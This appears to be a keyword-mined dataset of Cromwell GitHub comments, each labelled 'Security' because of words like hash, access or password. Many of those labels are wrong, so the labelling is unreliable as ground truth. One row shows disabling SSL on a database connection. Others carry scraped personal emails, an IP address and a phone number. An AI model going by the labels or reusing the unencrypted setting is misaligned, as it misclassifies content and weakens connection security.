Security,"I believe we want to patch this off of the cromwell hash we are currently; using - 3eb1623; https://github.com/broadinstitute/cromwell/commit/3eb1623d9a5ffdf0fc3626820eab84ae6560b2cd. On Fri, Mar 18, 2016 at 12:01 PM, mcovarr notifications@github.com wrote:. > Sounds good; > ; > —; > You are receiving this because you are subscribed to this thread.; > Reply to this email directly or view it on GitHub; > https://github.com/broadinstitute/cromwell/issues/587#issuecomment-198426842",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/587#issuecomment-198459262:52,hash,hash,52,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/587#issuecomment-198459262,1,['hash'],['hash']
Security,I came here to say what I apparently said a few months ago already :). We don't have access to a SLURM cluster so anything we put together would be a guess on our part. I know folks have been able to pretty easily get LSF & PBS working based on our example of an SGE configuration so my assumption is that it's not hard but I have no way of knowing. If someone were to get it working and submit docs we'd happily accept them but we have no way of handling that ourselves.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1750#issuecomment-281771190:85,access,access,85,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1750#issuecomment-281771190,1,['access'],['access']
Security,"I can access it now. It's really gross to have to sign into a private jira in order to see bug reports from an open source project though. If we have to use JIRA for some reason, is there a way to at least make it publicly visible without a login?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5031#issuecomment-502154980:6,access,access,6,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5031#issuecomment-502154980,1,['access'],['access']
Security,I can add a test.; I'm all for making PRs to CWL conformance tests but it's going to increase the merge time of our PRs if we want to wait for it to be in the CWL repo. Also we'd need to unpin the hash for conformance test or update it every time..,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3438#issuecomment-374939225:197,hash,hash,197,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3438#issuecomment-374939225,1,['hash'],['hash']
Security,"I can't reproduce this error with hash 437d1b592ca606cdd96276a1cf85bf84594c31eb on develop, though I do still see the TMPDIR bug. I'll work on fixing that.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3743#issuecomment-395613110:34,hash,hash,34,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3743#issuecomment-395613110,1,['hash'],['hash']
Security,"I can't think of any runtime parameters (with the exception of `docker`); that should change the hashing. Also, are the inputs to the task hashed or; is it the fully rendered command block or what? Because if I have a; parameter to the task (such as ""preemptible_attempts"") that is only used in; the runtime block, (ideally) I'd like it to be ignored for call caching; purposes. On Fri, Sep 8, 2017 at 3:12 PM, Kate Voss <notifications@github.com> wrote:. > As a *workflow runner*, I want *certain parameters to be ignored in the; > hashing process*, so that I can *call cache on more workflows when the; > result is exactly the same*.; >; > - Effort: *?*; > - Risk: *Medium*; > - We should err on the side of hashing a workflow differently if we; > are not absolutely confident that the parameter does not impact the result.; > - Which parameters are ignored is NOT user-editable. This is to; > prevent users from accidentally ignoring parameters that do impact the; > result.; > - Business value: *Medium*; >; > Some parameters, such as preemptible_attempts and CPU, don't affect the; > outcome of the workflow but workflows with different CPU values will not; > call cache.; >; > @LeeTL1220 <https://github.com/leetl1220> and @geoffjentry; > <https://github.com/geoffjentry> to provide additional thoughts and; > context if helpful.; > Related issue #1210; > <https://github.com/broadinstitute/cromwell/issues/1210>; >; > —; > You are receiving this because you were mentioned.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/2604>, or mute the; > thread; > <https://github.com/notifications/unsubscribe-auth/ACDXk24fM_SrXs0gx-Ry1aw1opHFZAb5ks5sgZG5gaJpZM4PRlLU>; > .; >. -- ; Lee Lichtenstein; Broad Institute; 75 Ames Street, Room 8011A; Cambridge, MA 02142; 617 714 8632",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2604#issuecomment-328198717:97,hash,hashing,97,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2604#issuecomment-328198717,4,['hash'],"['hashed', 'hashing']"
Security,"I cant get the sra filesystem to work. Here is the error:. ```; [2020-08-21 11:08:59,62] [info] WorkflowManagerActor Workflow dbd5cdc0-c79a-42cd-b929-56ddb1115467 failed (during InitializingWorkflowState): common.exception.AggregatedMessageException: Failed to instantiate backend filesystem:; Cannot find a filesystem with name sra in the configuration. Available filesystems: ftp, s3, gcs, oss, drs, http; 	at common.validation.Validation$ValidationChecked$.$anonfun$unsafe$2(Validation.scala:98); 	at cats.syntax.EitherOps$.valueOr$extension(either.scala:66); 	at common.validation.Validation$ValidationChecked$.unsafe$extension(Validation.scala:98); 	at cromwell.backend.BackendConfigurationDescriptor.configuredPathBuilderFactories$lzycompute(backend.scala:109); 	at cromwell.backend.BackendConfigurationDescriptor.configuredPathBuilderFactories(backend.scala:108); 	at cromwell.backend.BackendConfigurationDescriptor.pathBuilders(backend.scala:120); 	at cromwell.backend.standard.StandardInitializationActor.pathBuilders$lzycompute(StandardInitializationActor.scala:62); 	at cromwell.backend.standard.StandardInitializationActor.pathBuilders(StandardInitializationActor.scala:62); 	at cromwell.backend.google.pipelines.common.PipelinesApiInitializationActor.$anonfun$workflowPaths$2(PipelinesApiInitializationActor.scala:137); 	at scala.concurrent.Future.$anonfun$flatMap$1(Future.scala:307); 	at scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:41); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:64); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:92); 	at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:23); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:85); 	at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:92); 	at akka.dispatch.TaskInvocation.run(Abst",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5793:419,validat,validation,419,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5793,8,"['Validat', 'validat']","['Validation', 'ValidationChecked', 'validation']"
Security,"I did another run last night, and I have found a few entries like this including `iam.serviceAccounts.*` permissions:; ```; insertId: 1mk6qq6ej6zkd; logName: projects/mccarroll-mocha/logs/cloudaudit.googleapis.com%2Fdata_access; protoPayload:; '@type': type.googleapis.com/google.cloud.audit.AuditLog; authenticationInfo:; principalEmail: giulio@broadinstitute.org; principalSubject: user:giulio@broadinstitute.org; authorizationInfo:; - granted: true; permission: iam.serviceAccounts.list; resource: projects/mccarroll-mocha; resourceAttributes: {}; methodName: google.iam.admin.v1.ListServiceAccounts; request:; '@type': type.googleapis.com/google.iam.admin.v1.ListServiceAccountsRequest; name: projects/mccarroll-mocha; page_size: 100; requestMetadata:; callerIp: 64.112.179.105; callerSuppliedUserAgent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101; Firefox/80.0,gzip(gfe); destinationAttributes: {}; requestAttributes:; auth: {}; time: '2020-09-03T03:28:37.843325531Z'; resourceName: projects/mccarroll-mocha; serviceName: iam.googleapis.com; status: {}; receiveTimestamp: '2020-09-03T03:28:38.742413691Z'; resource:; labels:; location: global; method: google.iam.admin.v1.ListServiceAccounts; project_id: mccarroll-mocha; service: iam.googleapis.com; version: v1; type: api; severity: INFO; timestamp: '2020-09-03T03:28:37.734190692Z'; ```. Sometimes like this instead:; ```; insertId: 1mk6qq6ek68fs; logName: projects/mccarroll-mocha/logs/cloudaudit.googleapis.com%2Fdata_access; protoPayload:; '@type': type.googleapis.com/google.cloud.audit.AuditLog; authenticationInfo:; principalEmail: google@broadinstitute.com; principalSubject: user:google@broadinstitute.com; authorizationInfo:; - granted: true; permission: iam.serviceAccounts.list; resource: projects/mccarroll-mocha; resourceAttributes: {}; methodName: google.iam.admin.v1.ListServiceAccounts; request:; '@type': type.googleapis.com/google.iam.admin.v1.ListServiceAccountsRequest; name: projects/mccarroll-mocha; r",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4304#issuecomment-686595080:286,audit,audit,286,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4304#issuecomment-686595080,4,"['Audit', 'audit', 'authenticat', 'authoriz']","['AuditLog', 'audit', 'authenticationInfo', 'authorizationInfo']"
Security,I did not add documentation for the user authentication portion because I didn't understand how it works! If somebody would like to explain it to me I can expand these docs,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/532:41,authenticat,authentication,41,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/532,1,['authenticat'],['authentication']
Security,"I did not have any experience with this little Maven-based utility so I performed the following steps for post-upgrade verification.; ```; sdk install maven; mvn compile; mvn test; mvn package // I think this is a superset of `compile` and `test` but they all take just a few seconds so 🤷‍♂️ ; ```; Closing automatic PR https://github.com/broadinstitute/cromwell/pull/6743 in favor of this one because we can trivially upgrade to the latest version, not just a security-hotfixed older version.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6747:461,secur,security-hotfixed,461,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6747,1,['secur'],['security-hotfixed']
Security,"I did performance testing by with a wdl that has 50 outputs. On a cache hit, it attempts to copy the 50 files, so with my change it would also perform 50*2 location lookups. I ran this wdl 10 times without my changes, and 10 times with my changes, with `call_cache_egress` set to ""none"". For each run, I looked at the timestamps for [when the job hashing job is initialized](https://github.com/broadinstitute/cromwell/blob/develop/engine/src/main/scala/cromwell/engine/workflow/lifecycle/execution/job/EngineJobExecutionActor.scala#L504) , to [when the workflow completes](https://github.com/broadinstitute/cromwell/blob/develop/engine/src/main/scala/cromwell/engine/workflow/lifecycle/execution/WorkflowExecutionActor.scala#L350). Without my changes, the difference between those timestamps was on average 9 seconds. . With my changes, the difference between those timestamps was on average 16 seconds.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6432#issuecomment-892952274:347,hash,hashing,347,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6432#issuecomment-892952274,1,['hash'],['hashing']
Security,"I did some cleanup on this yesterday. Things I was planning to do and didn't have time for due to prod incident:; * Check all language to be sure it's really clear when we're dealing with WSM auth tokens and when we're dealing with blob SAS tokens.; * Either a lot more comments throughout or one large comment with pointers throughout, to clarify the different paths we could take to blob access and when they're useful, what they mean.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6954#issuecomment-1332204180:390,access,access,390,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6954#issuecomment-1332204180,2,['access'],['access']
Security,"I do not see a good explanation in docs on how soft/hard links work in cromwell.; For instance, you say:; ```; # Possible values: file, path; # ""file"" will compute an md5 hash of the file content.; # ""path"" will compute an md5 hash of the file path. This strategy will only be effective if the duplication-strategy (above) is set to ""soft-link"",; # in order to allow for the original file path to be hashed.; hashing-strategy: ""path""; ```; here it is not clear how to make it check BOTH file content and the path. Or if path implies that both path and file is schecked. It is also not clear what will be the difference (other than this option) between hard and soft link localization.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4077:171,hash,hash,171,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4077,4,['hash'],"['hash', 'hashed', 'hashing-strategy']"
Security,"I don't have access to broad jira so I'm wondering if there is any progress on this bug? @rsasch . We get into the same trouble here. We run our WDL on AWS with batch backend. To share a little more info in addition to what people already see, I saw in the `DELOCALIZING OUTPUTS` section ""reconfigured-script.sh"" I noticed it failed to delocalize files in `Array[File]` in our struct just like what others see. It seems those files are skipped and not ""scanned"" just like @hkeward pointed out above.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5592#issuecomment-1442197318:13,access,access,13,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5592#issuecomment-1442197318,1,['access'],['access']
Security,"I don't quite understand why this has failed, github actions suggests that this build was working before and my change caused it to crash. FWIW, I find the travis test logs extremely hard to navigate. . I tried to download the log locally and with a couple of greps found this: . ```; - should successfully run hello_google_legacy_machine_selection *** FAILED *** (6 minutes, 33 seconds); centaur.test.CentaurTestException: Invalid metadata response:; -Missing key: calls.wf_hello.hello.jes.machineType; at centaur.test.CentaurTestException$.apply(CentaurTestException.scala:34); at centaur.test.Operations$$anon$28.checkDiff$1(Test.scala:737); at centaur.test.Operations$$anon$28.$anonfun$validateMetadata$8(Test.scala:779); at map @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$8(Test.scala:779); at map @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$6(Test.scala:777); at flatMap @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$6(Test.scala:777); at flatMap @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$5(Test.scala:776); at unsafeToFuture @ centaur.api.CentaurCromwellClient$.$anonfun$retryRequest$3(CentaurCromwellClient.scala:151); at timeout @ cromwell.api.model.package$EnhancedFailureResponseOrT$.timeout$extension(package.scala:61); at fromFuture @ cromwell.api.model.package$EnhancedFutureHttpResponse$.asFailureResponseOrT$extension(package.scala:38); ...; ```. Any help would be appreciated :)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-749303690:690,validat,validateMetadata,690,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-749303690,5,['validat'],['validateMetadata']
Security,"I don't see any error logging associated with this cromwell hash. However, I did see this:. ```; 2016-05-03 10:14:45,314 cromwell-system-akka.actor.default-dispatcher-17 ERROR - BackendCallExecutionActor [UUID(643d3c46):CollectUnsortedReadgroupBamQualityMetrics:22]: 503 Service Unavailable; {; ""code"" : 503,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Backend Error"",; ""reason"" : ""backendError""; } ],; ""message"" : ""Backend Error""; }; com.google.api.client.googleapis.json.GoogleJsonResponseException: 503 Service Unavailable; {; ""code"" : 503,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Backend Error"",; ""reason"" : ""backendError""; } ],; ""message"" : ""Backend Error""; }; at com.google.api.client.googleapis.json.GoogleJsonResponseException.from(GoogleJsonResponseException.java:145) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:113) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:40) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services.AbstractGoogleClientRequest$1.interceptResponse(AbstractGoogleClientRequest.java:321) ~[cromwell.jar:0.19]; at com.google.api.client.http.HttpRequest.execute(HttpRequest.java:1056) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:419) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:352) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.execute(AbstractGoogleClientRequest.java:469) ~[cromwell.jar:0.19]; at cromwell.engine.backend.io.filesystem.gcs.GcsFileSystemProvider$$anonfun$crc32cHash$1.apply(GcsFileSystemProvider.scala:191) ~[cromwell.jar:0.19]; at cromwell.e",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/775#issuecomment-216661991:60,hash,hash,60,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/775#issuecomment-216661991,1,['hash'],['hash']
Security,"I don't think it implies the header and body will **both** have the same hash for any given request. It sounds more like it will either be in the header or the body, hence they check one and then the other. Can you point me to a docker registry that doesn't follow this rule?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4864#issuecomment-487764851:73,hash,hash,73,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4864#issuecomment-487764851,1,['hash'],['hash']
Security,"I encountered this error when running a WDL:; ```message: Runtime validation failed; causedBy: ; message: Task hello has an invalid runtime attribute docker = !! NOT FOUND !!; ```. I understand that it requires a docker attribute. The issue is that the error gets found at runtime. This should be caught when validating the WDL. . The risk is that users could ""run half their tasks and only find out mid-workflow that one needs an extra parameter"" (ChrisL's words).",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2932:66,validat,validation,66,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2932,2,['validat'],"['validating', 'validation']"
Security,"I exposed this as `monitoring_image` workflow option, and included the Dockerfile & script in `supportedBackends/google/pipelines/v2alpha1/src/main/resources/cromwell-monitor/`. Should we also add a CI script that builds the image?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4510#issuecomment-451601217:2,expose,exposed,2,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4510#issuecomment-451601217,1,['expose'],['exposed']
Security,"I feel uneasy recommending an unencrypted connection to a database, especially when the MySQL team went out of their way to start warning about this issue. That said, the simplest copypasta you can use to remove that warning is to pass the specified parameter in your database url:. In this stanza, change the url from:. ```; db {; driver = ""com.mysql.jdbc.Driver""; url = ""jdbc:mysql://host/cromwell""; user = ""user""; password = ""pass""; connectionTimeout = 5000; }; ```. To:. ```; db {; driver = ""com.mysql.jdbc.Driver""; url = ""jdbc:mysql://host/cromwell?useSSL=false""; user = ""user""; password = ""pass""; connectionTimeout = 5000; }; ```. Or if there are already other params already on your url, append using ""&"" instead of ""?"":. ```; db {; driver = ""com.mysql.jdbc.Driver""; url = ""jdbc:mysql://host/cromwell?other=param&useSSL=false""; user = ""user""; password = ""pass""; connectionTimeout = 5000; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1591#issuecomment-254523992:417,password,password,417,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1591#issuecomment-254523992,6,['password'],['password']
Security,"I finally figured out that the problem has to do with special characters in a password. If I use an all-alpha password, everything works fine. If I use a password with shell metacharacters like `$`, `!` or `*` then the Docker login seems to silently fail and consequently the private image pull fails as well.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2329325655:78,password,password,78,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2329325655,3,['password'],['password']
Security,"I find 18 occurrences. `./backend/src/main/scala/cromwell/backend/ExecutionHash.scala: // TODO: PBE: ideally hashes should be deterministic; ./backend/src/test/scala/cromwell/backend/caching/CachingConfigSpec.scala:// TODO PBE Adapt to how new caching works, but the test logic should not need much change; ./database/src/test/scala/cromwell/database/slick/SlickDatabaseSpec.scala: // TODO PBE get rid of this after the migration of #789 has run.; ./engine/src/main/scala/cromwell/engine/workflow/WorkflowActor.scala: // TODO PBE Is this the right place for startTime ?; ./engine/src/main/scala/cromwell/engine/workflow/WorkflowActor.scala: // TODO: PBE: some of the x-es have an actually execution & output stores.; ./engine/src/main/scala/cromwell/engine/workflow/WorkflowManagerActor.scala: // TODO PBE Restart: to be verified after restart is implemented but these WorkflowSucceededResponse/WorkflowFailedResponse seem useless; ./engine/src/main/scala/cromwell/webservice/CromwellApiService.scala: // TODO: PBE: Certainly want to do something for this! But probably not to the WMA; ./engine/src/test/scala/cromwell/engine/workflow/MaterializeWorkflowDescriptorActorSpec.scala: // TODO PBE: this should be done by MWDA (ticket #1076); ./engine/src/test/scala/cromwell/engine/workflow/MaterializeWorkflowDescriptorActorSpec.scala: // TODO: PBE: Re-enable (ticket #1063); ./engine/src/test/scala/cromwell/engine/WorkflowManagerActorSpec.scala: // TODO PBE: Restart workflows tests: re-add (but somewhere else?) in 0.21; ./project/Settings.scala: //""-deprecation"", // TODO: PBE: Re-enable deprecation warnings; ./services/src/main/scala/cromwell/services/metadata/MetadataService.scala: /* TODO: PBE: No MetadataServiceActor.props until circular dependencies fixed.; ./supportedBackends/jes/src/main/scala/cromwell/backend/impl/jes/JesAsyncBackendJobExecutionActor.scala: // TODO: PBE: Trace callers of ""new CallContext()"". Seems to be multiple places in JES, etc. For now:; ./supportedBackends/jes/sr",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1221#issuecomment-240175479:109,hash,hashes,109,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1221#issuecomment-240175479,1,['hash'],['hashes']
Security,"I fixed the regex. It turned out that this also fixed any issues. > Thanks for finding and fixing this!. Thank you for trusting me with push access on this repository. It makes it easier for me as all tests run immediately, also the tests that need private variables. Also I can restart jobs on travis now that looks like they are failed due to some intermittent connection error. I had to restart one for this PR, and it indeed turned green on the retry. This makes it easier for me to fix any bugs I find. The trust is much appreciated.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5437#issuecomment-594475836:141,access,access,141,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5437#issuecomment-594475836,1,['access'],['access']
Security,"I flooded the Local backend with scattered sleeps and tried to access metadata, status, submit workflows etc...; I'd like to try more benchmarky things though",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1152#issuecomment-232186556:63,access,access,63,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1152#issuecomment-232186556,1,['access'],['access']
Security,"I found a hash collision :-D:. WdlArray(WdlArrayType(WdlStringType), Seq(WdlString(""cromwell.binding.values.WdlStringcromwell.binding.values.WdlStringcromwell.binding.values.WdlString""))).getHash == WdlArray(WdlArrayType(WdlStringType), Seq(WdlString(""cromwell.binding.values.WdlString""), WdlString(""cromwell.binding.values.WdlString""))).getHash",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/280#issuecomment-155211635:10,hash,hash,10,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/280#issuecomment-155211635,1,['hash'],['hash']
Security,"I got it working now by setting the service-account in `google.conf`. Excellent, thanks for your help!. I was looking into the wrong place: I didn't realize that Cromwell did not find the account at all, I thought it just had a problem with access rights. ----. To answers to your questions, I had set the environment variable; `export GOOGLE_APPLICATION_CREDENTIALS=/Users/jwilppu/cromwell/project-test1-59b66448c3ab.json`; by following these instructions https://cromwell.readthedocs.io/en/develop/tutorials/PipelinesApi101/ which has a link to this page https://cloud.google.com/docs/authentication/production . The result of command `gcloud auth list` is; ```; Credentialed Accounts; ACTIVE ACCOUNT; * juha.wilppu@gmail.com. To set the active account, run:; $ gcloud config set account `ACCOUNT`; ```. I have now removed the environment variable.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3690#issuecomment-392432321:241,access,access,241,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3690#issuecomment-392432321,2,"['access', 'authenticat']","['access', 'authentication']"
Security,"I got some clarification. . @ruchim showed me how to use the API to get preemption data. However, using that API I looked for evidence of preemption in four submissions, each launching 1000 workflows, and each workflow conducting a 25-way scatter. All of these scatter jobs are set to run on preemptiible VMs. So that is 4 X 1000 X 25 = 100K jobs run on preemptible machines. Each job takes between 30 minutes and an hour to run. I saw no reported incidents of preemption. I'm not sure that I believe this is the case, and am wondering if either I'm access the preemption data incorrectly, or if cromwell is not reporting is correctly.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1860#issuecomment-274493127:550,access,access,550,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1860#issuecomment-274493127,1,['access'],['access']
Security,"I got this error while running JES on single workflow mode. ; However, I really do not know what happened. It seems like some jobs ran fine. Cromwell hangs and won't shutdown properly after a Ctl-C... ```; [2016-10-31 19:16:34,92] [error] 5a34e38c:crsp_validation_workflow.clinical_sensitivity_run_create_seg_gt_table:0:1: Hash error, disabling call caching for this job.; java.lang.Exception: Unable to generate input: File gt_seg_file hash. Caused by 404 Not Found; {; ""code"" : 404,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Not Found"",; ""reason"" : ""notFound""; } ],; ""message"" : ""Not Found""; }; at cromwell.engine.workflow.lifecycle.execution.callcaching.EngineJobHashingActor$$anonfun$4.applyOrElse(EngineJobHashingActor.scala:51); at cromwell.engine.workflow.lifecycle.execution.callcaching.EngineJobHashingActor$$anonfun$4.applyOrElse(EngineJobHashingActor.scala:45); at scala.PartialFunction$OrElse.apply(PartialFunction.scala:167); at akka.actor.FSM$class.processEvent(FSM.scala:666); at cromwell.engine.workflow.lifecycle.execution.callcaching.EngineJobHashingActor.akka$actor$LoggingFSM$$super$processEvent(EngineJobHashingActor.scala:18); at akka.actor.LoggingFSM$class.processEvent(FSM.scala:799); at cromwell.engine.workflow.lifecycle.execution.callcaching.EngineJobHashingActor.processEvent(EngineJobHashingActor.scala:18); at akka.actor.FSM$class.akka$actor$FSM$$processMsg(FSM.scala:657); at akka.actor.FSM$$anonfun$receive$1.applyOrElse(FSM.scala:651); at akka.actor.Actor$class.aroundReceive(Actor.scala:484); at cromwell.engine.workflow.lifecycle.execution.callcaching.EngineJobHashingActor.aroundReceive(EngineJobHashingActor.scala:18); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); at akka.actor.ActorCell.invoke(ActorCell.scala:495); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); at akka.dispatch.Mailbox.run(Mailbox.scala:224); at akka.dispatch.Mailbox.exec(Mailbox.scala:234); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1637:323,Hash,Hash,323,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1637,2,"['Hash', 'hash']","['Hash', 'hash']"
Security,"I had `hasing-strategy` instead of `hashing-strategy` in my config and lost loads of hours trying to debug the unbearably slow caching I was experiencing, and it turns out that the entire time Cromwell was simply ignoring the config I had written because of the typo. Cromwell should emit warnings when it sees config it doesn't recognize instead of silently ignoring them.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7109:36,hash,hashing-strategy,36,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7109,1,['hash'],['hashing-strategy']
Security,"I had the same issue. I got the same error message:; ```; [2020-07-27 18:34:00,37] [error] PipelinesApiAsyncBackendJobExecutionActor [3d2d7a27wf_hello.hello:NA:1]: Error attempting to Execute; cromwell.engine.io.IoAttempts$EnhancedCromwellIoException: [Attempted 1 time(s)] - StorageException: xxx@xxx.iam.gserviceaccount.com does not have serviceusage.services.use access to the Google Cloud project.; Caused by: com.google.cloud.storage.StorageException: xxx@xxx.iam.gserviceaccount.com does not have serviceusage.services.use access to the Google Cloud project.; ```; I had set up my credentials with:; ```; export GOOGLE_APPLICATION_CREDENTIALS=sa.json; ```; and had this configuration in `google.conf` copied from the [tutorial](https://cromwell.readthedocs.io/en/stable/tutorials/PipelinesApi101/):; ```; google {; application-name = ""cromwell""; auths = [; {; name = ""application-default""; scheme = ""application_default""; }; ]; }. engine {; filesystems {; gcs {; auth = ""application-default""; project = ""xxx""; }; }; }; ```; That clearly did not work. I tried to follow the logic in this post. I followed Horneth suggestion to use `service-account`'s authorization and I took the [auths](https://cromwell.readthedocs.io/en/develop/backends/Google/) configuration and changed `pem-file` to `json-file` in `google.conf` as follows:; ```; google {; application-name = ""cromwell""; auths = [; {; name = ""service_account""; scheme = ""service_account""; service-account-id = ""xxx@xxx.iam.gserviceaccount.com""; json-file = ""sa.json""; }; ]; }. engine {; filesystems {; gcs {; auth = ""service_account""; project = ""xxx""; }; }; }; ```; And I have replaced every other instance of `auth = ""application-default""` with `auth = ""service_account""`. Now when I run Cromwell:; ```; java -Dconfig.file=google.conf -jar cromwell-52.jar run hello.wdl -i hello.inputs; ```; I don't get the error anymore. I do get a different error:; ```; [2020-07-27 22:54:56,48] [info] WorkflowManagerActor Workflow 0fb5e69d-7d70-407e-9",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3690#issuecomment-664753906:366,access,access,366,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3690#issuecomment-664753906,4,['access'],['access']
